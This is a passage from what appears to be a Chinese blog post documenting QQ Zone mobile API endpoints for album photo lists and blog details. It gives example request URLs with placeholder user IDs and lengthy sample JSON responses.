<p><a href="https://h5.qzone.qq.com/webapp/json/mqzone_photo/getPhotoList2?g_tk=1190425035&amp;uin=QQ号码&amp;albumid=相册ID&amp;ps=0&amp;pn=20&amp;password=&amp;password_cleartext=0&amp;swidth=1080&amp;sheight=1920" target="_blank" rel="noopener">https://h5.qzone.qq.com/webapp/json/mqzone_photo/getPhotoList2?g_tk=1190425035&amp;uin=QQ号码&amp;albumid=相册ID&amp;ps=0&amp;pn=20&amp;password=&amp;password_cleartext=0&amp;swidth=1080&amp;sheight=1920</a></p>
</blockquote>
<p>uid=当前用户QQ号码，albumid=相册ID, ps=页码，pn=页面大小</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"ret"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        <span class="attr">"album"</span>: &#123;</span><br><span class="line">            "uin": QQ号码, // 用户QQ</span><br><span class="line">            "albumid": "相册ID", // 相册ID</span><br><span class="line">            "name": "相册名称", // 相册名称</span><br><span class="line">            "desc": "",  // 相册描述</span><br><span class="line">            "createtime": 1534254963, // 创建时间</span><br><span class="line">            "moditytime": 1558863208, // 更新时间</span><br><span class="line">            "lastuploadtime": 1534255181, // 上一次上传时间</span><br><span class="line">            "priv": 3,</span><br><span class="line">            "total": 50,</span><br><span class="line">            "question": "",</span><br><span class="line">            "answer": "",</span><br><span class="line">            "allow_share": 0,</span><br><span class="line">            "album_white_list": [],</span><br><span class="line">            "svrtime": 0,</span><br><span class="line">            "busi_param": &#123;&#125;,</span><br><span class="line">            "birth_time": 0,</span><br><span class="line">            "type": 0,</span><br><span class="line">            "isSubscribe": true,</span><br><span class="line">            "opmask": 8196,</span><br><span class="line">            "coverurl": "http://b304.photo.store.qq.com/psb?/相册ID/Zldsv*bLhSk.XwV2uChedWgDFH*wlyyQQo77uteBYJA!/m/dDABAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;tl=1&amp;vuin=QQ号码&amp;tm=1589270400#sce=14-11-3&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-4-0",// 相册封面</span><br><span class="line">            "bitmap": "10010011",</span><br><span class="line">            "birth_sexual": 0,</span><br><span class="line">            "birth_nickname": "",</span><br><span class="line">            "birth_year": 0,</span><br><span class="line">            "birth_month": 0,</span><br><span class="line">            "birth_day": 0,</span><br><span class="line">            "birth_type": 0,</span><br><span class="line">            "individual": 0,</span><br><span class="line">            "material": &#123;</span><br><span class="line">                "iItemId": 0,</span><br><span class="line">                "iTypeId": 0,</span><br><span class="line">                "iItemType": 0,</span><br><span class="line">                "strItemName": "",</span><br><span class="line">                "iExpireTime": 0,</span><br><span class="line">                "vecFile": [],</span><br><span class="line">                "strItemSummary": "",</span><br><span class="line">                "strDescription": "",</span><br><span class="line">                "stThumb": &#123;</span><br><span class="line">                    "iFileId": 0,</span><br><span class="line">                    "strName": "",</span><br><span class="line">                    "strUrl": "",</span><br><span class="line">                    "strMd5": "",</span><br><span class="line">                    "iSize": 0,</span><br><span class="line">                    "iFileType": 0,</span><br><span class="line">                    "iWidth": 0,</span><br><span class="line">                    "iHeight": 0</span><br><span class="line">                &#125;,</span><br><span class="line">                "stBanner": &#123;</span><br><span class="line">                    "iFileId": 0,</span><br><span class="line">                    "strName": "",</span><br><span class="line">                    "strUrl": "",</span><br><span class="line">                    "strMd5": "",</span><br><span class="line">                    "iSize": 0,</span><br><span class="line">                    "iFileType": 0,</span><br><span class="line">                    "iWidth": 0,</span><br><span class="line">                    "iHeight": 0</span><br><span class="line">                &#125;,</span><br><span class="line">                "uiSettleTime": 0,</span><br><span class="line">                "strTraceInfo": "",</span><br><span class="line">                "strDesignerInfo": "",</span><br><span class="line">                "strExtFields": [],</span><br><span class="line">                "mapExtInfo": &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            "albumowner": "QQ号码",</span><br><span class="line">            "shareattrs": [],</span><br><span class="line">            "is_share": 0,</span><br><span class="line">            "owner": 0,</span><br><span class="line">            "love_time": 0,</span><br><span class="line">            "lover_events": [],</span><br><span class="line">            "love_value": 0,</span><br><span class="line">            "recoded_days": 0,</span><br><span class="line">            "video_num": 0,</span><br><span class="line">            "photo_num": 0</span><br><span class="line">        &#125;,</span><br><span class="line">        "finish": 0,// 是否显示完成 1是 0没有</span><br><span class="line">        "list_count": 20, // pn大小</span><br><span class="line">        "total_count": 50,// 总共大小</span><br><span class="line">        "photos": &#123; //  相册</span><br><span class="line">            "1534176000": [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"1"</span>: &#123;</span><br><span class="line">                        "url": "http://b304.photo.store.qq.com/psb?/相册ID/Zldsv*bLhSk.XwV2uChedWgDFH*wlyyQQo77uteBYJA!/b/dDABAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=4wU4BAAAAAARF*o!&amp;tl=1&amp;vuin=QQ号码&amp;tm=1589270400#sce=14-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-4-0", // 原图</span><br><span class="line">                        "width": 1507,</span><br><span class="line">                        "height": 1080,</span><br><span class="line">                        "focus_x": 753,</span><br><span class="line">                        "focus_y": 540,</span><br><span class="line">                        "enlarge_rate": 110</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "11": &#123;</span><br><span class="line">                        "url": "http://b304.photo.store.qq.com/psb?/相册ID/Zldsv*bLhSk.XwV2uChedWgDFH*wlyyQQo77uteBYJA!/m/dDABAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=4wU4BAAAAAARF*o!&amp;tl=1&amp;vuin=QQ号码&amp;tm=1589270400#sce=14-11-3&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-4-0", // 缩略图</span><br><span class="line">                        "width": 279,</span><br><span class="line">                        "height": 200,</span><br><span class="line">                        "focus_x": 139,</span><br><span class="line">                        "focus_y": 100,</span><br><span class="line">                        "enlarge_rate": 110</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "picname": "中国结", // 相片名称</span><br><span class="line">                    "sloc": "NDR000mKH03gclt1VgQdMAEAAAAAAAA!",</span><br><span class="line">                    "lloc": "NDR000mKH03gclt1VgQdMAEAAAAAAAA!",</span><br><span class="line">                    "type": 17,</span><br><span class="line">                    "ismylike": false,</span><br><span class="line">                    "likecount": 0,</span><br><span class="line">                    "commentcount": 0,</span><br><span class="line">                    "busi_param": &#123;</span><br><span class="line">                        "5": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!^||^http://user.qzone.qq.com/QQ号码/batchphoto/相册ID/1534255091137000^||^1",</span><br><span class="line">                        "6": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!",</span><br><span class="line">                        "7": "1",</span><br><span class="line">                        "21": "1534255091137000",</span><br><span class="line">                        "35": "",</span><br><span class="line">                        "144": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!_quan"</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "clientkey": "",</span><br><span class="line">                    "isIndependentUgc": 0,</span><br><span class="line">                    "opsynflag": 32,</span><br><span class="line">                    "uUploadTime": 1534255181,</span><br><span class="line">                    "modifytime": 1534255181,</span><br><span class="line">                    "desc": "",</span><br><span class="line">                    "orglikekey": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!",</span><br><span class="line">                    "curlikekey": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!",</span><br><span class="line">                    "cropinfo": &#123;</span><br><span class="line">                        "centerx_scale": 50,</span><br><span class="line">                        "centery_scale": 50</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "uploadUin": 0,</span><br><span class="line">                    "shoottime": 1449560954,</span><br><span class="line">                    "flag": 0,</span><br><span class="line">                    "poi": &#123;</span><br><span class="line">                        "poi_id": "",</span><br><span class="line">                        "poi_x": "",</span><br><span class="line">                        "poi_y": "",</span><br><span class="line">                        "poi_name": "",</span><br><span class="line">                        "poi_address": "",</span><br><span class="line">                        "poi_type": 0,</span><br><span class="line">                        "region_name": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "facelist": [],</span><br><span class="line">                    "raw": 0,</span><br><span class="line">                    "isAutoPlayGif": false,</span><br><span class="line">                    "photoTag": [],</span><br><span class="line">                    "opmask": 39,</span><br><span class="line">                    "albumid": "相册ID",</span><br><span class="line">                    "piccategory": 0,</span><br><span class="line">                    "videoflag": 0,</span><br><span class="line">                    "videodata": &#123;</span><br><span class="line">                        "videoid": "",</span><br><span class="line">                        "videourl": "",</span><br><span class="line">                        "actiontype": 0,</span><br><span class="line">                        "actionurl": "",</span><br><span class="line">                        "clientkey": "",</span><br><span class="line">                        "filetype": 0,</span><br><span class="line">                        "videotype": 0,</span><br><span class="line">                        "videotime": 0,</span><br><span class="line">                        "videourls": &#123;&#125;,</span><br><span class="line">                        "playtype": 0,</span><br><span class="line">                        "videostatus": 0,</span><br><span class="line">                        "toast": "",</span><br><span class="line">                        "extendinfo": &#123;&#125;,</span><br><span class="line">                        "videoremark": &#123;</span><br><span class="line">                            "iconurl": "",</span><br><span class="line">                            "icondesc": "",</span><br><span class="line">                            "remark": "",</span><br><span class="line">                            "actiontype": 0,</span><br><span class="line">                            "actionurl": "",</span><br><span class="line">                            "orgwebsite": 0</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "video_show_type": 0,</span><br><span class="line">                        "isPanorama": false,</span><br><span class="line">                        "video_source": 1,</span><br><span class="line">                        "sloc": "",</span><br><span class="line">                        "lloc": "",</span><br><span class="line">                        "report_video_feeds_type": 0,</span><br><span class="line">                        "videoplaycnt": 0,</span><br><span class="line">                        "is_share": false,</span><br><span class="line">                        "adv_delay_time": 0,</span><br><span class="line">                        "video_webview_url": "",</span><br><span class="line">                        "isOnWifiPlay": false,</span><br><span class="line">                        "isHadSetPlayOnWifi": false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "isCoverPic": false,</span><br><span class="line">                    "pic_host_nick": &#123;</span><br><span class="line">                        "uin": QQ号码,</span><br><span class="line">                        "nick": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "luckyMoneyDesc": "",</span><br><span class="line">                    "geo": &#123;</span><br><span class="line">                        "poi_id": "",</span><br><span class="line">                        "poi_x": "",</span><br><span class="line">                        "poi_y": "",</span><br><span class="line">                        "poi_name": "",</span><br><span class="line">                        "poi_address": "",</span><br><span class="line">                        "poi_type": 0,</span><br><span class="line">                        "region_name": " "</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "operation": &#123;</span><br><span class="line">                        "busi_param": &#123;&#125;,</span><br><span class="line">                        "weixin_url": "",</span><br><span class="line">                        "qq_url": "",</span><br><span class="line">                        "share_info": &#123;</span><br><span class="line">                            "title": "",</span><br><span class="line">                            "summary": "",</span><br><span class="line">                            "photourl": &#123;&#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "schema_info": &#123;</span><br><span class="line">                            "actiontype": 0,</span><br><span class="line">                            "actionurl": "",</span><br><span class="line">                            "downloadurl": "",</span><br><span class="line">                            "appid": "",</span><br><span class="line">                            "postparams": "",</span><br><span class="line">                            "usepost": 0,</span><br><span class="line">                            "schemapageurl": "",</span><br><span class="line">                            "appname": "",</span><br><span class="line">                            "loadingpage": false,</span><br><span class="line">                            "yingyongbao": true</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "recomm_cookie": &#123;&#125;,</span><br><span class="line">                        "click_stream_report": &#123;&#125;,</span><br><span class="line">                        "qboss_trace": "",</span><br><span class="line">                        "custom_btn": [],</span><br><span class="line">                        "feed_report_cookie": &#123;&#125;,</span><br><span class="line">                        "generic_url": "",</span><br><span class="line">                        "bypass_param": &#123;&#125;,</span><br><span class="line">                        "droplist_cookie": &#123;&#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "musicdata": &#123;</span><br><span class="line">                        "musicid": "",</span><br><span class="line">                        "musicurl": "",</span><br><span class="line">                        "coverurl": "",</span><br><span class="line">                        "width": 0,</span><br><span class="line">                        "height": 0,</span><br><span class="line">                        "title": "",</span><br><span class="line">                        "musictime": 0,</span><br><span class="line">                        "musicMId": "",</span><br><span class="line">                        "musicType": "",</span><br><span class="line">                        "musicMUrl": ""</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "audio_summary": ""</span><br><span class="line">                &#125;,</span><br><span class="line">                ...</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取日志详情"><a href="#获取日志详情" class="headerlink" title="获取日志详情"></a>获取日志详情</h4><blockquote>
<p><a href="https://h5.qzone.qq.com/webapp/json/mqzone_detail/blog?g_tk=37401305&amp;appid=2&amp;uin=QQ号码&amp;refresh_type=1&amp;cellid=1552294923&amp;format=json" target="_blank" rel="noopener">https://h5.qzone.qq.com/webapp/json/mqzone_detail/blog?g_tk=37401305&amp;appid=2&amp;uin=QQ号码&amp;refresh_type=1&amp;cellid=1552294923&amp;format=json</a> (GET)</p>
</blockquote>
<p>cellid文章ID</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"ret"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        <span class="attr">"cell_comm"</span>: &#123;</span><br><span class="line">            <span class="attr">"appid"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"subid"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"refer"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"time"</span>: <span class="number">1559532408</span>,</span><br><span class="line">            <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"actionurl"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/blog/1559532408"</span>,</span><br><span class="line">            <span class="attr">"originaltype"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"operatemask"</span>: <span class="number">321360011</span>,</span><br><span class="line">            <span class="attr">"feedskey"</span>: <span class="string">"QQ号码_2_1559532408__1559532408"</span>,</span><br><span class="line">            <span class="attr">"orglikekey"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/blog/1559532408"</span>,</span><br><span class="line">            <span class="attr">"curlikekey"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/blog/1559532408"</span>,</span><br><span class="line">            <span class="attr">"feedstype"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"feedsattr"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"ugckey"</span>: <span class="string">"QQ号码_2_1559532408_"</span>,</span><br><span class="line">            <span class="attr">"clientkey"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"show_mask"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"uflag"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"shield"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"ugcrightkey"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"interestkey"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"recomtype"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"feedsid"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"adv_stytle"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"adv_subtype"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"right_info"</span>: &#123;</span><br><span class="line">                <span class="attr">"ugc_right"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"allow_uins"</span>: []</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"recomlayout"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"recomreportid"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"space_right"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"reportfeedsattr"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"recom_show_type"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"wup_feeds_type"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"stMapABTest"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"is_stay"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">"paykey"</span>: <span class="string">"201906030QQ号码1559532408"</span>,</span><br><span class="line">            <span class="attr">"operatemask2"</span>: <span class="number">1612845056</span>,</span><br><span class="line">            <span class="attr">"positionmask"</span>: <span class="number">187827712</span>,</span><br><span class="line">            <span class="attr">"positionmask2"</span>: <span class="number">134217728</span>,</span><br><span class="line">            <span class="attr">"editmask"</span>: <span class="number">4294967295</span>,</span><br><span class="line">            <span class="attr">"custom_droplist"</span>: [],</span><br><span class="line">            <span class="attr">"extendInfo"</span>: &#123;</span><br><span class="line">                <span class="attr">"blogHtml"</span>: <span class="string">"文章的富文本"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"feedsattr2"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"feedsDelTime"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"sqDynamicFeedsKey"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"iClick_area"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"extendInfoData"</span>: &#123;&#125;,</span><br><span class="line">            <span class="attr">"hot_score"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"is_kuolie"</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_userinfo"</span>: &#123;</span><br><span class="line">            <span class="attr">"user"</span>: &#123;</span><br><span class="line">                <span class="attr">"uin"</span>: QQ号码,</span><br><span class="line">                <span class="attr">"nickname"</span>: <span class="string">"__fy"</span>,</span><br><span class="line">                <span class="attr">"timestamp"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"uinkey"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"logo"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"vip"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"viplevel"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"viptype"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"qzonedesc"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"is_owner"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"operation_mask"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"uid"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"talk_id"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"portrait_id"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"is_own"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isFamousWhite"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isQzoneUser"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isSetNickGlint"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"medalInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"descicon"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"icon_width"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"icon_height"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isSweetVip"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"stuStarInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"iStarStatus"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"iStarLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isHighStarVip"</span>: <span class="number">0</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"stuCombineDiamondInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"iShowType"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"iVipLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isAnnualVipEver"</span>: <span class="number">0</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"isSafeModeUser"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"vipShowType"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"namePlate"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"actiontype"</span>: <span class="number">35</span>,</span><br><span class="line">                <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"decoration"</span>: [],</span><br><span class="line">                <span class="attr">"tagInfos"</span>: [],</span><br><span class="line">                <span class="attr">"strPortraitId"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"under_nickname_desc"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"liveshowMedalInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"uFansCount"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"uVisitorCount"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isCmtVerifyOpen"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"iCurUserType"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"displayflag"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"vtime"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"authqzoneMedalInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"eUserTypeReport"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"iVipActType"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"openid_users"</span>: &#123;</span><br><span class="line">                    <span class="attr">"openid"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"nickname"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"logo"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"sex"</span>: <span class="number">0</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"action_desc"</span>: <span class="string">"原创日志"</span>,</span><br><span class="line">            <span class="attr">"actiontype"</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="attr">"luckyMoneyPics"</span>: []</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_id"</span>: &#123;</span><br><span class="line">            <span class="attr">"cellid"</span>: <span class="string">"1559532408"</span>,</span><br><span class="line">            <span class="attr">"subid"</span>: <span class="string">""</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cell_title"</span>: &#123;</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"PHP Webshell下绕过disable_function的方法"</span>,</span><br><span class="line">            <span class="attr">"titleurl"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/blog/1559532408"</span>,</span><br><span class="line">            <span class="attr">"userlist"</span>: [],</span><br><span class="line">            <span class="attr">"usernum"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"user"</span>: &#123;</span><br><span class="line">                <span class="attr">"uin"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"nickname"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"timestamp"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"uinkey"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"logo"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"vip"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"viplevel"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"viptype"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"qzonedesc"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"is_owner"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"operation_mask"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"uid"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"talk_id"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"portrait_id"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"is_own"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isFamousWhite"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isQzoneUser"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isSetNickGlint"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"medalInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"jump_url"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"descicon"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"icon_width"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"icon_height"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"isSweetVip"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"stuStarInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"iStarStatus"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"iStarLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isHighStarVip"</span>: <span class="number">0</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"stuCombineDiamondInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"iShowType"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"iVipLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"isAnnualVipEver"</span>: <span class="number">0</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"isSafeModeUser"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"vipShowType"</span>: <span class="number">-1</span>,</span><br><span class="line">                <span class="attr">"namePlate"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"decoration"</span>: [],</span><br><span class="line">                <span class="attr">"tagInfos"</span>: [],</span><br><span class="line">                <span class="attr">"strPortraitId"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"under_nickname_desc"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="attr">"liveshowMedalInfo"</span>: &#123;</span><br><span class="line">                    <span class="attr">"medal_type"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"medal_state"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"pic_url"</span>: <span class="string">""</span>,</span><br><span 